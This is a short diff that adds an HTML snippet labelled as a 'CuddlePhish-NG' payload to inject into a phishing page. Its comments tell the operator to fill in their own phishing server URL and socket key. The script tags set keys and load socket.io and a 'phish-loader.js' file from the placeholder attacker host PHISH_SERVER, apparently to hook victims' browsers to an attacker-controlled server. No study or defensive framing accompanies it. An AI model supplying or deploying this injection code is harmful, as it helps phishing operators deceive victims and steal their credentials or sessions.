@@ -1,0 +1,8 @@
+<!-- CuddlePhish-NG payload — inject into phishing page -->
+<!-- Replace PHISH_SERVER with your server URL and SOCKET_KEY with config.socket_key -->
+<script>
+  window.__cpKey    = 'SOCKET_KEY';
+  window.__cpTarget = 'TARGET_KEY';
+</script>
+<script src="https://PHISH_SERVER/socket.io/socket.io.js"></script>
+<script src="https://PHISH_SERVER/phish-loader.js"></script>
